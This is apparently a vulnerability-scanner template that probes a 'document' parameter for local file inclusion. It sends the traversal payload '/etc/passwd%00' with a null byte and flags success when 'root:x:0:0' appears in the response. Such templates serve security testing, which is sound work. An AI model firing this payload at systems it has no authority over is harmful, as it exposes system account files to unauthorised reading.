id: lfi6-0271
name: 'Traversal in document'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via document'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      document:
        - '/etc/passwd%00'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
